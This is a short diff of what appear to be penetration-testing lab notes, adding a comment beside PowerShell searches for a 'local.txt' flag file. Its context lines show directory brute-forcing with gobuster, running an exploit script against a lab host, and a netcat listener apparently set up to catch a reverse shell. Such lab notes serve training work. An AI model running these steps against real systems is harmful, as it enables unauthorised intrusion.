@@ -17,6 +17,7 @@ gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directo
 python3 50801.py http://192.168.225.141:81
 nc -nvlp 1234
 
+# the first one doesn't seem to work
 Get-Childitem –Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
 ```
